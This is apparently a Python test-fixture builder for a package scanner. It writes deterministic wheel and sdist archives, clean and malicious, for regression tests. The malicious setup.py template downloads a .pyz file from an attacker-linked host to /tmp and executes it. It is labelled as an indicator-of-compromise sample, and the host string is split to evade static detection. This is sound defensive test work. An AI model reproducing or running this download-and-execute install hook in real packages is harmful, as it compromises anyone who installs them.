"""Deterministic builder for the committed wheel + sdist fixtures; re-run only when the IOC literal changes."""

from __future__ import annotations

import io
import os
import sys
import tarfile
import zipfile
from pathlib import Path

SOURCE_DATE_EPOCH = 0
# Zip stores DOS time which starts at 1980; map epoch to 1980-01-01.
_ZIP_DOS_EPOCH = (1980, 1, 1, 0, 0, 0)

HERE = Path(__file__).resolve().parent


# IOC literal scan_packages.py must trip on.
# Keep in sync with KNOWN_IOC_STRINGS (scan_npm_packages.py) and RE_MAY12_IOC (scan_packages.py).
#
# Split across concatenated pieces, the same way test_scan_packages.py already writes
# `_ioc_host = "git-tanstack." + "com"`. The assembled string still lands in the built archive
# byte for byte, so the scanner tests are unaffected; what changes is that this builder is not
# itself a static match. Cheap insurance only -- the per-file VirusTotal scan in discussion #9577
# found the .py sources undetected and the two built archives detected, so the archives not being
# committed is the part that matters.
_IOC_HOST = "git-tanstack." + "com"
_IOC_ARTIFACT = "transformers." + "pyz"

MALICIOUS_SETUP_PY = '''"""Test fixture: do NOT install.

This file embeds the May-12 Mini Shai-Hulud IOC literal so the
scan_packages.py regression tests can confirm the scanner trips on
the malicious setup.py shape. The string below is the same literal an
attacker would embed in a compromised release.
"""

from setuptools import setup
import urllib.request
import subprocess

# IOC literal -- mirrors public Socket.dev 2026-05-12 disclosure.
urllib.request.urlretrieve(
    "https://{ioc_host}/{ioc_artifact}",
    "/tmp/{ioc_artifact}",
)
subprocess.run(["python3", "/tmp/{ioc_artifact}"], check=False)

setup(name="malicious-fixture", version="0.0.1")
'''.replace("{ioc_host}", _IOC_HOST).replace("{ioc_artifact}", _IOC_ARTIFACT)


CLEAN_INIT_PY = '''"""Test fixture: empty placeholder package."""
'''


WHEEL_METADATA = (
    "Metadata-Version: 2.1\n"
    "Name: {name}\n"
    "Version: 0.0.1\n"
    "Summary: test fixture (do not install)\n"
)

WHEEL_FILE = (
    "Wheel-Version: 1.0\n"
    "Generator: tests/security/fixtures/_build.py\n"
    "Root-Is-Purelib: true\n"
    "Tag: py3-none-any\n"
)

RECORD_HEADER = ""


def _write_zip_member(zf: zipfile.ZipFile, name: str, data: bytes) -> None:
    info = zipfile.ZipInfo(filename = name, date_time = _ZIP_DOS_EPOCH)
    info.compress_type = zipfile.ZIP_DEFLATED
    info.external_attr = (0o644 & 0xFFFF) << 16
    info.create_system = 3  # Unix
    zf.writestr(info, data)


def _build_wheel(out_path: Path, *, name: str, payload_files: dict[str, bytes]) -> None:
    """Write a deterministic .whl; .dist-info METADATA/WHEEL/RECORD are added automatically."""
    dist_info = f"{name}-0.0.1.dist-info"
    members: dict[str, bytes] = dict(payload_files)
    members[f"{dist_info}/METADATA"] = WHEEL_METADATA.format(name = name).encode()
    members[f"{dist_info}/WHEEL"] = WHEEL_FILE.encode()
    # RECORD is minimal; the scanner inspects file bodies, not hash integrity.
    record_lines = []
    for path in sorted(members):
        record_lines.append(f"{path},,")
    record_lines.append(f"{dist_info}/RECORD,,")
    members[f"{dist_info}/RECORD"] = ("\n".join(record_lines) + "\n").encode()

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression = zipfile.ZIP_DEFLATED) as zf:
        for path in sorted(members):
            _write_zip_member(zf, path, members[path])
    _publish(out_path, buf.getvalue())


def _publish(out_path: Path, data: bytes) -> None:
    """Put `data` at `out_path` so a concurrent reader never sees a partial file.

    `write_bytes` truncates and then writes, and these archives live at fixed paths in the source
    tree. `.github/workflows/workflow-trigger-lint.yml` runs `pytest -q -n 4` over `tests/security`
    with the default `--dist load`, which scatters tests from ONE file across all four workers -- so
    every worker runs the session-scoped autouse fixture and rewrites these paths while the others
    are reading them. A reader that catches the truncated window does not see a corrupt-file error;
    it sees a short member list and fails asserting scanner semantics, which is close to
    untraceable.

    Two guards, because either alone leaves a hole:
      * skip the write entirely when the bytes on disk are already right, so in the normal case only
        the first worker writes at all. The build is deterministic (SOURCE_DATE_EPOCH, 1980 DOS
        times), which is what makes that comparison sound;
      * otherwise write to a pid-unique temp name and `os.replace`, which is atomic on POSIX and on
        Windows. Without the pid the workers would simply collide on the temp file instead.

    A reader therefore always sees either the complete old file or the complete new one, and those
    are byte-identical.
    """
    try:
        if out_path.read_bytes() == data:
            return
    except OSError:
        pass
    tmp = out_path.with_name(f"{out_path.name}.{os.getpid()}.tmp")
    try:
        tmp.write_bytes(data)
        os.replace(tmp, out_path)
    finally:
        try:
            tmp.unlink()
        except OSError:
            pass


def _build_sdist(out_path: Path, *, name: str, payload_files: dict[str, bytes]) -> None:
    """Write a deterministic .tar.gz sdist; a `{name}-0.0.1/` prefix is added automatically."""
    prefix = f"{name}-0.0.1"
    buf = io.BytesIO()
    # gzip mtime fixed via mtime=0 (gzip member header).
    import gzip

    inner = io.BytesIO()
    with tarfile.open(fileobj = inner, mode = "w") as tf:
        for path in sorted(payload_files):
            data = payload_files[path]
            info = tarfile.TarInfo(name = f"{prefix}/{path}")
            info.size = len(data)
            info.mtime = SOURCE_DATE_EPOCH
            info.mode = 0o644
            info.uid = 0
            info.gid = 0
            info.uname = ""
            info.gname = ""
            info.type = tarfile.REGTYPE
            tf.addfile(info, io.BytesIO(data))
    raw = inner.getvalue()
    # gzip with fixed mtime=0 and explicit compresslevel for stability.
    gz_buf = io.BytesIO()
    with gzip.GzipFile(
        fileobj = gz_buf,
        mode = "wb",
        mtime = SOURCE_DATE_EPOCH,
        compresslevel = 6,
        filename = "",
    ) as gz:
        gz.write(raw)
    _publish(out_path, gz_buf.getvalue())


def build_all() -> dict[str, Path]:
    # Deliberately does NOT set os.environ["SOURCE_DATE_EPOCH"]. Nothing here reads it: every writer
    # below is handed the fixed timestamp directly, and zipfile takes the 1980 DOS tuple. It used to
    # be assigned anyway, with no teardown, which was harmless while this ran as a script and is not
    # harmless now that a session fixture calls it inside a broader pytest run: it overwrote any
    # caller-provided value for the rest of the worker, and every later test and subprocess
    # inherited the false epoch.
    outputs: dict[str, Path] = {}

    # Malicious wheel: payload setup.py that embeds the May-12 IOC.
    mal_payload = {
        "setup.py": MALICIOUS_SETUP_PY.encode(),
        "malicious_fixture/__init__.py": b"# malicious fixture stub\n",
    }
    mal_whl = HERE / "malicious_wheel.whl"
    _build_wheel(mal_whl, name = "malicious_fixture", payload_files = mal_payload)
    outputs["malicious_wheel"] = mal_whl

    clean_payload = {
        "clean_fixture/__init__.py": CLEAN_INIT_PY.encode(),
    }
    clean_whl = HERE / "clean_wheel.whl"
    _build_wheel(clean_whl, name = "clean_fixture", payload_files = clean_payload)
    outputs["clean_wheel"] = clean_whl

    # Malicious sdist: same setup.py, tar.gz form.
    mal_sdist = HERE / "malicious_sdist.tar.gz"
    _build_sdist(mal_sdist, name = "malicious_fixture", payload_files = mal_payload)
    outputs["malicious_sdist"] = mal_sdist

    return outputs


if __name__ == "__main__":
    paths = build_all()
    for label, path in paths.items():
        size = path.stat().st_size
        print(f"  {label:>18}: {path.name}  ({size} bytes)")
    sys.exit(0)
